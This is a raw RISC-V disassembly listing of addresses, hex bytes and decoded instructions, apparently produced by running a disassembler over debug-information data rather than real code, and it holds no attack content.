    11fc:	0100                	addi	s0,sp,128
    11fe:	0105                	addi	sp,sp,1
    1200:	16090103          	lb	sp,352(s2)
    1204:	0100                	addi	s0,sp,128
    1206:	08090303          	lb	t1,128(s2)
    120a:	0100                	addi	s0,sp,128
    120c:	0605                	addi	a2,a2,1
    120e:	10090103          	lb	sp,256(s2)
    1212:	0100                	addi	s0,sp,128
    1214:	0c05                	addi	s8,s8,1
    1216:	0e090103          	lb	sp,224(s2)
    121a:	0100                	addi	s0,sp,128
    121c:	0b05                	addi	s6,s6,1
    121e:	14090103          	lb	sp,320(s2)
    1222:	0100                	addi	s0,sp,128
    1224:	0c05                	addi	s8,s8,1
    1226:	08090103          	lb	sp,128(s2)
    122a:	0100                	addi	s0,sp,128
    122c:	14090203          	lb	tp,320(s2)
    1230:	0100                	addi	s0,sp,128
    1232:	0105                	addi	sp,sp,1
    1234:	12090103          	lb	sp,288(s2)
    1238:	0100                	addi	s0,sp,128
    123a:	08090303          	lb	t1,128(s2)
    123e:	0100                	addi	s0,sp,128
    1240:	0b05                	addi	s6,s6,1
    1242:	1c090903          	lb	s2,448(s2)
    1246:	0100                	addi	s0,sp,128
    1248:	0a05                	addi	s4,s4,1
    124a:	02090103          	lb	sp,32(s2)
    124e:	0100                	addi	s0,sp,128
    1250:	04090203          	lb	tp,64(s2)
    1254:	0100                	addi	s0,sp,128
    1256:	0705                	addi	a4,a4,1
    1258:	0a090103          	lb	sp,160(s2)
    125c:	0100                	addi	s0,sp,128
    125e:	1205                	addi	tp,tp,-31
    1260:	0c097c03          	0xc097c03
    1264:	0100                	addi	s0,sp,128
    1266:	1005                	c.nop	-31
    1268:	08090003          	lb	zero,128(s2)
    126c:	0100                	addi	s0,sp,128
    126e:	0b05                	addi	s6,s6,1
    1270:	04090003          	lb	zero,64(s2)
    1274:	0100                	addi	s0,sp,128
    1276:	0805                	addi	a6,a6,1
    1278:	0a090603          	lb	a2,160(s2)
    127c:	0100                	addi	s0,sp,128
    127e:	0e05                	addi	t3,t3,1
    1280:	0a090303          	lb	t1,160(s2)
    1284:	0100                	addi	s0,sp,128
    1286:	0a05                	addi	s4,s4,1
    1288:	08090103          	lb	sp,128(s2)
    128c:	0100                	addi	s0,sp,128
    128e:	0b05                	addi	s6,s6,1
    1290:	08090103          	lb	sp,128(s2)
    1294:	0100                	addi	s0,sp,128
    1296:	0f05                	addi	t5,t5,1
    1298:	06090103          	lb	sp,96(s2)
    129c:	0100                	addi	s0,sp,128
    129e:	0b05                	addi	s6,s6,1
    12a0:	06090103          	lb	sp,96(s2)
    12a4:	0100                	addi	s0,sp,128
    12a6:	0d05                	addi	s10,s10,1
    12a8:	04090103          	lb	sp,64(s2)
    12ac:	0100                	addi	s0,sp,128
    12ae:	1305                	addi	t1,t1,-31
    12b0:	04090203          	lb	tp,64(s2)
    12b4:	0100                	addi	s0,sp,128
    12b6:	1205                	addi	tp,tp,-31
    12b8:	0c090003          	lb	zero,192(s2)
    12bc:	0100                	addi	s0,sp,128
    12be:	1005                	c.nop	-31
    12c0:	04090003          	lb	zero,64(s2)
    12c4:	0100                	addi	s0,sp,128
    12c6:	0c05                	addi	s8,s8,1
    12c8:	3a090403          	lb	s0,928(s2)
    12cc:	0100                	addi	s0,sp,128
    12ce:	0705                	addi	a4,a4,1
    12d0:	08090103          	lb	sp,128(s2)
    12d4:	0100                	addi	s0,sp,128
    12d6:	0c05                	addi	s8,s8,1
    12d8:	02090403          	lb	s0,32(s2)
    12dc:	0100                	addi	s0,sp,128
    12de:	0705                	addi	a4,a4,1
    12e0:	08090103          	lb	sp,128(s2)
    12e4:	0100                	addi	s0,sp,128
    12e6:	1605                	addi	a2,a2,-31
    12e8:	02090c03          	lb	s8,32(s2)
    12ec:	0100                	addi	s0,sp,128
    12ee:	1f05                	addi	t5,t5,-31
    12f0:	04090103          	lb	sp,64(s2)
    12f4:	0100                	addi	s0,sp,128
    12f6:	2405                	addiw	s0,s0,1
    12f8:	12090003          	lb	zero,288(s2)
    12fc:	0100                	addi	s0,sp,128
    12fe:	1305                	addi	t1,t1,-31
    1300:	04090003          	lb	zero,64(s2)
    1304:	0100                	addi	s0,sp,128
    1306:	0e05                	addi	t3,t3,1
    1308:	08090103          	lb	sp,128(s2)
    130c:	0100                	addi	s0,sp,128
    130e:	0c05                	addi	s8,s8,1
    1310:	08090003          	lb	zero,128(s2)
    1314:	0100                	addi	s0,sp,128
    1316:	04090103          	lb	sp,64(s2)
    131a:	0100                	addi	s0,sp,128
    131c:	1605                	addi	a2,a2,-31
    131e:	0200                	addi	s0,sp,256
    1320:	0104                	addi	s1,sp,128
    1322:	0a090003          	lb	zero,160(s2)
    1326:	0100                	addi	s0,sp,128
    1328:	1d05                	addi	s10,s10,-31
    132a:	0a097d03          	0xa097d03
    132e:	0100                	addi	s0,sp,128
    1330:	1305                	addi	t1,t1,-31
    1332:	0a090103          	lb	sp,160(s2)
    1336:	0100                	addi	s0,sp,128
    1338:	1105                	addi	sp,sp,-31
    133a:	02090803          	lb	a6,32(s2)
    133e:	0100                	addi	s0,sp,128
    1340:	0705                	addi	a4,a4,1
    1342:	12090103          	lb	sp,288(s2)
    1346:	0100                	addi	s0,sp,128
    1348:	0a05                	addi	s4,s4,1
    134a:	02090303          	lb	t1,32(s2)
    134e:	0100                	addi	s0,sp,128
    1350:	0f05                	addi	t5,t5,1
    1352:	0a090103          	lb	sp,160(s2)
    1356:	0100                	addi	s0,sp,128
    1358:	0705                	addi	a4,a4,1
    135a:	04090103          	lb	sp,64(s2)
    135e:	0100                	addi	s0,sp,128
    1360:	0f05                	addi	t5,t5,1
    1362:	02090303          	lb	t1,32(s2)
    1366:	0100                	addi	s0,sp,128
    1368:	0705                	addi	a4,a4,1
    136a:	06090103          	lb	sp,96(s2)
    136e:	0100                	addi	s0,sp,128
    1370:	02097303          	0x2097303
    1374:	0100                	addi	s0,sp,128
    1376:	0a05                	addi	s4,s4,1
    1378:	02091003          	lh	zero,32(s2)
    137c:	0100                	addi	s0,sp,128
    137e:	0f05                	addi	t5,t5,1
    1380:	0a090103          	lb	sp,160(s2)
    1384:	0100                	addi	s0,sp,128
    1386:	2605                	addiw	a2,a2,1
    1388:	08090003          	lb	zero,128(s2)
    138c:	0100                	addi	s0,sp,128
    138e:	0705                	addi	a4,a4,1
    1390:	06090103          	lb	sp,96(s2)
    1394:	0100                	addi	s0,sp,128
    1396:	0c05                	addi	s8,s8,1
    1398:	02090403          	lb	s0,32(s2)
    139c:	0100                	addi	s0,sp,128
    139e:	0705                	addi	a4,a4,1
    13a0:	0a090103          	lb	sp,160(s2)
    13a4:	0100                	addi	s0,sp,128
    13a6:	02090403          	lb	s0,32(s2)
    13aa:	0100                	addi	s0,sp,128
    13ac:	1a090103          	lb	sp,416(s2)
    13b0:	0100                	addi	s0,sp,128
    13b2:	0e05                	addi	t3,t3,1
    13b4:	02090403          	lb	s0,32(s2)
    13b8:	0100                	addi	s0,sp,128
    13ba:	0a05                	addi	s4,s4,1
    13bc:	10090003          	lb	zero,256(s2)
    13c0:	0100                	addi	s0,sp,128
    13c2:	0b05                	addi	s6,s6,1
    13c4:	04090103          	lb	sp,64(s2)
    13c8:	0100                	addi	s0,sp,128
    13ca:	0a05                	addi	s4,s4,1
    13cc:	08090103          	lb	sp,128(s2)
    13d0:	0100                	addi	s0,sp,128
    13d2:	1505                	addi	a0,a0,-31
    13d4:	0200                	addi	s0,sp,256
    13d6:	0104                	addi	s1,sp,128
    13d8:	0a090003          	lb	zero,160(s2)
    13dc:	0100                	addi	s0,sp,128
    13de:	1405                	addi	s0,s0,-31
    13e0:	10090103          	lb	sp,256(s2)
    13e4:	0100                	addi	s0,sp,128
    13e6:	1705                	addi	a4,a4,-31
    13e8:	04090003          	lb	zero,64(s2)
    13ec:	0100                	addi	s0,sp,128
    13ee:	1405                	addi	s0,s0,-31
    13f0:	0e090003          	lb	zero,224(s2)
    13f4:	0100                	addi	s0,sp,128
    13f6:	0905                	addi	s2,s2,1
    13f8:	0c090003          	lb	zero,192(s2)
    13fc:	0100                	addi	s0,sp,128
    13fe:	0b05                	addi	s6,s6,1
    1400:	0200                	addi	s0,sp,256
    1402:	0304                	addi	s1,sp,384
    1404:	02090103          	lb	sp,32(s2)
    1408:	0100                	addi	s0,sp,128
    140a:	3e05                	addiw	t3,t3,-31
    140c:	0200                	addi	s0,sp,256
    140e:	0304                	addi	s1,sp,384
    1410:	12097f03          	0x12097f03
    1414:	0100                	addi	s0,sp,128
    1416:	0905                	addi	s2,s2,1
    1418:	0200                	addi	s0,sp,256
    141a:	0104                	addi	s1,sp,128
    141c:	0a090003          	lb	zero,160(s2)
    1420:	0100                	addi	s0,sp,128
    1422:	0705                	addi	a4,a4,1
    1424:	0a090203          	lb	tp,160(s2)
    1428:	0100                	addi	s0,sp,128
    142a:	0905                	addi	s2,s2,1
    142c:	0200                	addi	s0,sp,256
    142e:	0504                	addi	s1,sp,640
    1430:	02090103          	lb	sp,32(s2)
    1434:	0100                	addi	s0,sp,128
    1436:	0a05                	addi	s4,s4,1
    1438:	0200                	addi	s0,sp,256
    143a:	0504                	addi	s1,sp,640
    143c:	0c090103          	lb	sp,192(s2)
    1440:	0100                	addi	s0,sp,128
    1442:	4d05                	li	s10,1
    1444:	0200                	addi	s0,sp,256
    1446:	0504                	addi	s1,sp,640
    1448:	02097e03          	0x2097e03
    144c:	0100                	addi	s0,sp,128
    144e:	1405                	addi	s0,s0,-31
    1450:	0200                	addi	s0,sp,256
    1452:	0104                	addi	s1,sp,128
    1454:	0a090003          	lb	zero,160(s2)
    1458:	0100                	addi	s0,sp,128
    145a:	1205                	addi	tp,tp,-31
    145c:	0200                	addi	s0,sp,256
    145e:	0104                	addi	s1,sp,128
    1460:	04090003          	lb	zero,64(s2)
    1464:	0100                	addi	s0,sp,128
    1466:	0705                	addi	a4,a4,1
    1468:	0200                	addi	s0,sp,256
    146a:	0104                	addi	s1,sp,128
    146c:	04090003          	lb	zero,64(s2)
    1470:	0100                	addi	s0,sp,128
    1472:	2005                	0x2005
    1474:	0200                	addi	s0,sp,256
    1476:	0204                	addi	s1,sp,256
    1478:	02090003          	lb	zero,32(s2)
    147c:	0100                	addi	s0,sp,128
    147e:	3205                	addiw	tp,tp,-31
    1480:	0200                	addi	s0,sp,256
    1482:	0404                	addi	s1,sp,512
    1484:	0a090003          	lb	zero,160(s2)
    1488:	0100                	addi	s0,sp,128
    148a:	0705                	addi	a4,a4,1
    148c:	14090403          	lb	s0,320(s2)
    1490:	0100                	addi	s0,sp,128
    1492:	0905                	addi	s2,s2,1
    1494:	0200                	addi	s0,sp,256
    1496:	0204                	addi	s1,sp,256
    1498:	02090103          	lb	sp,32(s2)
    149c:	0100                	addi	s0,sp,128
    149e:	1e05                	addi	t3,t3,-31
    14a0:	0200                	addi	s0,sp,256
    14a2:	0204                	addi	s1,sp,256
    14a4:	0e097f03          	0xe097f03
    14a8:	0100                	addi	s0,sp,128
    14aa:	0705                	addi	a4,a4,1
    14ac:	0200                	addi	s0,sp,256
    14ae:	0104                	addi	s1,sp,128
    14b0:	0a090003          	lb	zero,160(s2)
    14b4:	0100                	addi	s0,sp,128
    14b6:	0a090203          	lb	tp,160(s2)
    14ba:	0100                	addi	s0,sp,128
    14bc:	0d05                	addi	s10,s10,1
    14be:	02090403          	lb	s0,32(s2)
    14c2:	0100                	addi	s0,sp,128
    14c4:	0b05                	addi	s6,s6,1
    14c6:	12090003          	lb	zero,288(s2)
    14ca:	0100                	addi	s0,sp,128
    14cc:	04090103          	lb	sp,64(s2)
    14d0:	0100                	addi	s0,sp,128
    14d2:	0a05                	addi	s4,s4,1
    14d4:	04090003          	lb	zero,64(s2)
    14d8:	0100                	addi	s0,sp,128
    14da:	0905                	addi	s2,s2,1
    14dc:	04090103          	lb	sp,64(s2)
    14e0:	0100                	addi	s0,sp,128
    14e2:	1005                	c.nop	-31
    14e4:	0e090103          	lb	sp,224(s2)
    14e8:	0100                	addi	s0,sp,128
    14ea:	0f05                	addi	t5,t5,1
    14ec:	04090003          	lb	zero,64(s2)
    14f0:	0100                	addi	s0,sp,128
    14f2:	0d05                	addi	s10,s10,1
    14f4:	04090003          	lb	zero,64(s2)
    14f8:	0100                	addi	s0,sp,128
    14fa:	0c05                	addi	s8,s8,1
    14fc:	04090203          	lb	tp,64(s2)
    1500:	0100                	addi	s0,sp,128
    1502:	0705                	addi	a4,a4,1
    1504:	06090103          	lb	sp,96(s2)
    1508:	0100                	addi	s0,sp,128
    150a:	0c05                	addi	s8,s8,1
    150c:	02090403          	lb	s0,32(s2)
    1510:	0100                	addi	s0,sp,128
    1512:	0705                	addi	a4,a4,1
    1514:	06090103          	lb	sp,96(s2)
    1518:	0100                	addi	s0,sp,128
    151a:	0c05                	addi	s8,s8,1
    151c:	02090503          	lb	a0,32(s2)
    1520:	0100                	addi	s0,sp,128
    1522:	0705                	addi	a4,a4,1
    1524:	06090103          	lb	sp,96(s2)
    1528:	0100                	addi	s0,sp,128
    152a:	0d05                	addi	s10,s10,1
    152c:	02090503          	lb	a0,32(s2)
    1530:	0100                	addi	s0,sp,128
    1532:	0705                	addi	a4,a4,1
    1534:	06090103          	lb	sp,96(s2)
    1538:	0100                	addi	s0,sp,128
    153a:	0e090103          	lb	sp,224(s2)
    153e:	0100                	addi	s0,sp,128
    1540:	0c05                	addi	s8,s8,1
    1542:	0e090503          	lb	a0,224(s2)
    1546:	0100                	addi	s0,sp,128
    1548:	0d05                	addi	s10,s10,1
    154a:	06090203          	lb	tp,96(s2)
    154e:	0100                	addi	s0,sp,128
    1550:	0705                	addi	a4,a4,1
    1552:	14090203          	lb	tp,320(s2)
    1556:	0100                	addi	s0,sp,128
    1558:	1e090103          	lb	sp,480(s2)
    155c:	0100                	addi	s0,sp,128
    155e:	02090403          	lb	s0,32(s2)
    1562:	0100                	addi	s0,sp,128
    1564:	0c090103          	lb	sp,192(s2)
    1568:	0100                	addi	s0,sp,128
    156a:	02090403          	lb	s0,32(s2)
    156e:	0100                	addi	s0,sp,128
    1570:	0b05                	addi	s6,s6,1
    1572:	0e090103          	lb	sp,224(s2)
    1576:	0100                	addi	s0,sp,128
    1578:	0705                	addi	a4,a4,1
    157a:	08090103          	lb	sp,128(s2)
    157e:	0100                	addi	s0,sp,128
    1580:	0b05                	addi	s6,s6,1
    1582:	097ef803          	0x97ef803
    1586:	0002                	c.slli	zero,0x0
    1588:	0501                	addi	a0,a0,0
    158a:	0309                	addi	t1,t1,2
    158c:	0902                	slli	s2,s2,0x0
    158e:	0002                	c.slli	zero,0x0
    1590:	0501                	addi	a0,a0,0
    1592:	0301                	addi	t1,t1,0
    1594:	0189                	addi	gp,gp,2
    1596:	0209                	addi	tp,tp,2
    1598:	0100                	addi	s0,sp,128
    159a:	0c090303          	lb	t1,192(s2)
    159e:	0100                	addi	s0,sp,128
    15a0:	0305                	addi	t1,t1,1
    15a2:	1e090203          	lb	tp,480(s2)
    15a6:	0100                	addi	s0,sp,128
    15a8:	14090203          	lb	tp,320(s2)
    15ac:	0100                	addi	s0,sp,128
    15ae:	0a05                	addi	s4,s4,1
    15b0:	18090303          	lb	t1,384(s2)
    15b4:	0100                	addi	s0,sp,128
    15b6:	0105                	addi	sp,sp,1
    15b8:	02090103          	lb	sp,32(s2)
    15bc:	0100                	addi	s0,sp,128
    15be:	0305                	addi	t1,t1,1
    15c0:	0a090903          	lb	s2,160(s2)
    15c4:	0100                	addi	s0,sp,128
    15c6:	0c05                	addi	s8,s8,1
    15c8:	14090103          	lb	sp,320(s2)
    15cc:	0100                	addi	s0,sp,128
    15ce:	0605                	addi	a2,a2,1
    15d0:	08090103          	lb	sp,128(s2)
    15d4:	0100                	addi	s0,sp,128
    15d6:	0c05                	addi	s8,s8,1
    15d8:	06090003          	lb	zero,96(s2)
    15dc:	0100                	addi	s0,sp,128
    15de:	0605                	addi	a2,a2,1
    15e0:	0c090103          	lb	sp,192(s2)
    15e4:	0100                	addi	s0,sp,128
    15e6:	0c05                	addi	s8,s8,1
    15e8:	06090003          	lb	zero,96(s2)
    15ec:	0100                	addi	s0,sp,128
    15ee:	0305                	addi	t1,t1,1
    15f0:	0a090103          	lb	sp,160(s2)
    15f4:	0100                	addi	s0,sp,128
    15f6:	0105                	addi	sp,sp,1
    15f8:	08097603          	0x8097603
    15fc:	0100                	addi	s0,sp,128
    15fe:	0304                	addi	s1,sp,384
    1600:	0505                	addi	a0,a0,1
    1602:	097f8b03          	lb	s6,151(t6) # fffffffffffe7097 <_end+0xffffffff7ffcbbd7>
    1606:	0020                	addi	s0,sp,8
    1608:	0401                	addi	s0,s0,0
    160a:	0502                	slli	a0,a0,0x0
    160c:	0309                	addi	t1,t1,2
    160e:	4c0900f7          	0x4c0900f7
    1612:	0100                	addi	s0,sp,128
    1614:	0305                	addi	t1,t1,1
    1616:	08090103          	lb	sp,128(s2)
    161a:	0100                	addi	s0,sp,128
    161c:	14090903          	lb	s2,320(s2)
    1620:	0100                	addi	s0,sp,128
    1622:	1a090103          	lb	sp,416(s2)
    1626:	0100                	addi	s0,sp,128
    1628:	0805                	addi	a6,a6,1
    162a:	04090003          	lb	zero,64(s2)
    162e:	0100                	addi	s0,sp,128
    1630:	0e05                	addi	t3,t3,1
    1632:	04090303          	lb	t1,64(s2)
    1636:	0100                	addi	s0,sp,128
    1638:	0105                	addi	sp,sp,1
    163a:	0e090103          	lb	sp,224(s2)
    163e:	0100                	addi	s0,sp,128
    1640:	0a090303          	lb	t1,160(s2)
    1644:	0100                	addi	s0,sp,128
    1646:	0905                	addi	s2,s2,1
    1648:	12090103          	lb	sp,288(s2)
    164c:	0100                	addi	s0,sp,128
    164e:	1b05                	addi	s6,s6,-31
    1650:	04090003          	lb	zero,64(s2)
    1654:	0100                	addi	s0,sp,128
    1656:	1905                	addi	s2,s2,-31
    1658:	04090003          	lb	zero,64(s2)
    165c:	0100                	addi	s0,sp,128
    165e:	2a05                	addiw	s4,s4,1
    1660:	02090003          	lb	zero,32(s2)
    1664:	0100                	addi	s0,sp,128
    1666:	3105                	addiw	sp,sp,-31
    1668:	06090003          	lb	zero,96(s2)
    166c:	0100                	addi	s0,sp,128
    166e:	0605                	addi	a2,a2,1
    1670:	02090003          	lb	zero,32(s2)
    1674:	0100                	addi	s0,sp,128
    1676:	1605                	addi	a2,a2,-31
    1678:	02090103          	lb	sp,32(s2)
    167c:	0100                	addi	s0,sp,128
    167e:	1005                	c.nop	-31
    1680:	08090103          	lb	sp,128(s2)
    1684:	0100                	addi	s0,sp,128
    1686:	0b05                	addi	s6,s6,1
    1688:	08090103          	lb	sp,128(s2)
    168c:	0100                	addi	s0,sp,128
    168e:	1005                	c.nop	-31
    1690:	02090103          	lb	sp,32(s2)
    1694:	0100                	addi	s0,sp,128
    1696:	0905                	addi	s2,s2,1
    1698:	0c090003          	lb	zero,192(s2)
    169c:	0100                	addi	s0,sp,128
    169e:	0e05                	addi	t3,t3,1
    16a0:	0c090003          	lb	zero,192(s2)
    16a4:	0100                	addi	s0,sp,128
    16a6:	0c05                	addi	s8,s8,1
    16a8:	02090003          	lb	zero,32(s2)
    16ac:	0100                	addi	s0,sp,128
    16ae:	2205                	addiw	tp,tp,1
    16b0:	02097f03          	0x2097f03
    16b4:	0100                	addi	s0,sp,128
    16b6:	0b05                	addi	s6,s6,1
    16b8:	0a090003          	lb	zero,160(s2)
    16bc:	0100                	addi	s0,sp,128
    16be:	1105                	addi	sp,sp,-31
    16c0:	0a090303          	lb	t1,160(s2)
    16c4:	0100                	addi	s0,sp,128
    16c6:	0b05                	addi	s6,s6,1
    16c8:	08090103          	lb	sp,128(s2)
    16cc:	0100                	addi	s0,sp,128
    16ce:	08090103          	lb	sp,128(s2)
    16d2:	0100                	addi	s0,sp,128
    16d4:	1005                	c.nop	-31
    16d6:	02090103          	lb	sp,32(s2)
    16da:	0100                	addi	s0,sp,128
    16dc:	0905                	addi	s2,s2,1
    16de:	0c090003          	lb	zero,192(s2)
    16e2:	0100                	addi	s0,sp,128
    16e4:	0e05                	addi	t3,t3,1
    16e6:	0c090003          	lb	zero,192(s2)
    16ea:	0100                	addi	s0,sp,128
    16ec:	0c05                	addi	s8,s8,1
    16ee:	04090003          	lb	zero,64(s2)
    16f2:	0100                	addi	s0,sp,128
    16f4:	1d05                	addi	s10,s10,-31
    16f6:	04097f03          	0x4097f03
    16fa:	0100                	addi	s0,sp,128
    16fc:	0b05                	addi	s6,s6,1
    16fe:	0a090003          	lb	zero,160(s2)
    1702:	0100                	addi	s0,sp,128
    1704:	0a05                	addi	s4,s4,1
    1706:	08090303          	lb	t1,128(s2)
    170a:	0100                	addi	s0,sp,128
    170c:	0105                	addi	sp,sp,1
    170e:	04090103          	lb	sp,64(s2)
    1712:	0100                	addi	s0,sp,128
    1714:	08090303          	lb	t1,128(s2)
    1718:	0100                	addi	s0,sp,128
    171a:	0905                	addi	s2,s2,1
    171c:	14090103          	lb	sp,320(s2)
    1720:	0100                	addi	s0,sp,128
    1722:	1905                	addi	s2,s2,-31
    1724:	04090003          	lb	zero,64(s2)
    1728:	0100                	addi	s0,sp,128
    172a:	2005                	0x2005
    172c:	06090003          	lb	zero,96(s2)
    1730:	0100                	addi	s0,sp,128
    1732:	0605                	addi	a2,a2,1
    1734:	02090003          	lb	zero,32(s2)
    1738:	0100                	addi	s0,sp,128
    173a:	1b05                	addi	s6,s6,-31
    173c:	02090103          	lb	sp,32(s2)
    1740:	0100                	addi	s0,sp,128
    1742:	0f05                	addi	t5,t5,1
    1744:	04090003          	lb	zero,64(s2)
    1748:	0100                	addi	s0,sp,128
    174a:	1205                	addi	tp,tp,-31
    174c:	08090103          	lb	sp,128(s2)
    1750:	0100                	addi	s0,sp,128
    1752:	0a05                	addi	s4,s4,1
    1754:	06090003          	lb	zero,96(s2)
    1758:	0100                	addi	s0,sp,128
    175a:	1205                	addi	tp,tp,-31
    175c:	0a090103          	lb	sp,160(s2)
    1760:	0100                	addi	s0,sp,128
    1762:	0a05                	addi	s4,s4,1
    1764:	06090003          	lb	zero,96(s2)
    1768:	0100                	addi	s0,sp,128
    176a:	1805                	addi	a6,a6,-31
    176c:	0a090103          	lb	sp,160(s2)
    1770:	0100                	addi	s0,sp,128
    1772:	0a05                	addi	s4,s4,1
    1774:	06090003          	lb	zero,96(s2)
    1778:	0100                	addi	s0,sp,128
    177a:	1005                	c.nop	-31
    177c:	0a090203          	lb	tp,160(s2)
    1780:	0100                	addi	s0,sp,128
    1782:	0b05                	addi	s6,s6,1
    1784:	08090103          	lb	sp,128(s2)
    1788:	0100                	addi	s0,sp,128
    178a:	0905                	addi	s2,s2,1
    178c:	02090103          	lb	sp,32(s2)
    1790:	0100                	addi	s0,sp,128
    1792:	0c05                	addi	s8,s8,1
    1794:	0c090003          	lb	zero,192(s2)
    1798:	0100                	addi	s0,sp,128
    179a:	2205                	addiw	tp,tp,1
    179c:	06097f03          	0x6097f03
    17a0:	0100                	addi	s0,sp,128
    17a2:	0b05                	addi	s6,s6,1
    17a4:	0a090003          	lb	zero,160(s2)
    17a8:	0100                	addi	s0,sp,128
    17aa:	0a090303          	lb	t1,160(s2)
    17ae:	0100                	addi	s0,sp,128
    17b0:	08090103          	lb	sp,128(s2)
    17b4:	0100                	addi	s0,sp,128
    17b6:	0905                	addi	s2,s2,1
    17b8:	02090103          	lb	sp,32(s2)
    17bc:	0100                	addi	s0,sp,128
    17be:	0c05                	addi	s8,s8,1
    17c0:	0c090003          	lb	zero,192(s2)
    17c4:	0100                	addi	s0,sp,128
    17c6:	1d05                	addi	s10,s10,-31
    17c8:	0c097f03          	0xc097f03
    17cc:	0100                	addi	s0,sp,128
    17ce:	0b05                	addi	s6,s6,1
    17d0:	0a090003          	lb	zero,160(s2)
    17d4:	0100                	addi	s0,sp,128
    17d6:	0a05                	addi	s4,s4,1
    17d8:	08090303          	lb	t1,128(s2)
    17dc:	0100                	addi	s0,sp,128
    17de:	0105                	addi	sp,sp,1
    17e0:	04090103          	lb	sp,64(s2)
    17e4:	0100                	addi	s0,sp,128
    17e6:	08090303          	lb	t1,128(s2)
    17ea:	0100                	addi	s0,sp,128
    17ec:	0f05                	addi	t5,t5,1
    17ee:	0a090103          	lb	sp,160(s2)
    17f2:	0100                	addi	s0,sp,128
    17f4:	0905                	addi	s2,s2,1
    17f6:	08090103          	lb	sp,128(s2)
    17fa:	0100                	addi	s0,sp,128
    17fc:	0605                	addi	a2,a2,1
    17fe:	02090103          	lb	sp,32(s2)
    1802:	0100                	addi	s0,sp,128
    1804:	0a05                	addi	s4,s4,1
    1806:	0a097f03          	0xa097f03
    180a:	0100                	addi	s0,sp,128
    180c:	0905                	addi	s2,s2,1
    180e:	08090003          	lb	zero,128(s2)
    1812:	0100                	addi	s0,sp,128
    1814:	0c05                	addi	s8,s8,1
    1816:	02090203          	lb	tp,32(s2)
    181a:	0100                	addi	s0,sp,128
    181c:	0105                	addi	sp,sp,1
    181e:	0c090103          	lb	sp,192(s2)
    1822:	0100                	addi	s0,sp,128
    1824:	08090303          	lb	t1,128(s2)
    1828:	0100                	addi	s0,sp,128
    182a:	0f05                	addi	t5,t5,1
    182c:	0e090103          	lb	sp,224(s2)
    1830:	0100                	addi	s0,sp,128
    1832:	0905                	addi	s2,s2,1
    1834:	08090103          	lb	sp,128(s2)
    1838:	0100                	addi	s0,sp,128
    183a:	0605                	addi	a2,a2,1
    183c:	02090103          	lb	sp,32(s2)
    1840:	0100                	addi	s0,sp,128
    1842:	0b05                	addi	s6,s6,1
    1844:	0a097f03          	0xa097f03
    1848:	0100                	addi	s0,sp,128
    184a:	0905                	addi	s2,s2,1
    184c:	0c090003          	lb	zero,192(s2)
    1850:	0100                	addi	s0,sp,128
    1852:	1105                	addi	sp,sp,-31
    1854:	0200                	addi	s0,sp,256
    1856:	0104                	addi	s1,sp,128
    1858:	02090003          	lb	zero,32(s2)
    185c:	0100                	addi	s0,sp,128
    185e:	0e05                	addi	t3,t3,1
    1860:	0200                	addi	s0,sp,256
    1862:	0104                	addi	s1,sp,128
    1864:	08090003          	lb	zero,128(s2)
    1868:	0100                	addi	s0,sp,128
    186a:	0c05                	addi	s8,s8,1
    186c:	02090203          	lb	tp,32(s2)
    1870:	0100                	addi	s0,sp,128
    1872:	0105                	addi	sp,sp,1
    1874:	0c090103          	lb	sp,192(s2)
    1878:	0100                	addi	s0,sp,128
    187a:	08090303          	lb	t1,128(s2)
    187e:	0100                	addi	s0,sp,128
    1880:	0d05                	addi	s10,s10,1
    1882:	0200                	addi	s0,sp,256
    1884:	0204                	addi	s1,sp,256
    1886:	0e090403          	lb	s0,224(s2)
    188a:	0100                	addi	s0,sp,128
    188c:	0805                	addi	a6,a6,1
    188e:	0200                	addi	s0,sp,256
    1890:	0204                	addi	s1,sp,256
    1892:	0c090003          	lb	zero,192(s2)
    1896:	0100                	addi	s0,sp,128
    1898:	0d05                	addi	s10,s10,1
    189a:	0200                	addi	s0,sp,256
    189c:	0204                	addi	s1,sp,256
    189e:	08090103          	lb	sp,128(s2)
    18a2:	0100                	addi	s0,sp,128
    18a4:	0805                	addi	a6,a6,1
    18a6:	0200                	addi	s0,sp,256
    18a8:	0204                	addi	s1,sp,256
    18aa:	0c090003          	lb	zero,192(s2)
    18ae:	0100                	addi	s0,sp,128
    18b0:	0305                	addi	t1,t1,1
    18b2:	0200                	addi	s0,sp,256
    18b4:	0204                	addi	s1,sp,256
    18b6:	08090103          	lb	sp,128(s2)
    18ba:	0100                	addi	s0,sp,128
    18bc:	1405                	addi	s0,s0,-31
    18be:	0200                	addi	s0,sp,256
    18c0:	0104                	addi	s1,sp,128
    18c2:	0a090003          	lb	zero,160(s2)
    18c6:	0100                	addi	s0,sp,128
    18c8:	0d05                	addi	s10,s10,1
    18ca:	14090203          	lb	tp,320(s2)
    18ce:	0100                	addi	s0,sp,128
    18d0:	0105                	addi	sp,sp,1
    18d2:	14090103          	lb	sp,320(s2)
    18d6:	0100                	addi	s0,sp,128
    18d8:	08090303          	lb	t1,128(s2)
    18dc:	0100                	addi	s0,sp,128
    18de:	0905                	addi	s2,s2,1
    18e0:	0e090103          	lb	sp,224(s2)
    18e4:	0100                	addi	s0,sp,128
    18e6:	08090103          	lb	sp,128(s2)
    18ea:	0100                	addi	s0,sp,128
    18ec:	1605                	addi	a2,a2,-31
    18ee:	0200                	addi	s0,sp,256
    18f0:	0104                	addi	s1,sp,128
    18f2:	02090003          	lb	zero,32(s2)
    18f6:	0100                	addi	s0,sp,128
    18f8:	0d05                	addi	s10,s10,1
    18fa:	0200                	addi	s0,sp,256
    18fc:	0104                	addi	s1,sp,128
    18fe:	0c090003          	lb	zero,192(s2)
    1902:	0100                	addi	s0,sp,128
    1904:	1205                	addi	tp,tp,-31
    1906:	0200                	addi	s0,sp,256
    1908:	0104                	addi	s1,sp,128
    190a:	0c090003          	lb	zero,192(s2)
    190e:	0100                	addi	s0,sp,128
    1910:	1005                	c.nop	-31
    1912:	0200                	addi	s0,sp,256
    1914:	0104                	addi	s1,sp,128
    1916:	04090003          	lb	zero,64(s2)
    191a:	0100                	addi	s0,sp,128
    191c:	0b05                	addi	s6,s6,1
    191e:	0200                	addi	s0,sp,256
    1920:	0104                	addi	s1,sp,128
    1922:	04090003          	lb	zero,64(s2)
    1926:	0100                	addi	s0,sp,128
    1928:	0905                	addi	s2,s2,1
    192a:	0200                	addi	s0,sp,256
    192c:	0104                	addi	s1,sp,128
    192e:	04090003          	lb	zero,64(s2)
    1932:	0100                	addi	s0,sp,128
    1934:	0a05                	addi	s4,s4,1
    1936:	02090203          	lb	tp,32(s2)
    193a:	0100                	addi	s0,sp,128
    193c:	0105                	addi	sp,sp,1
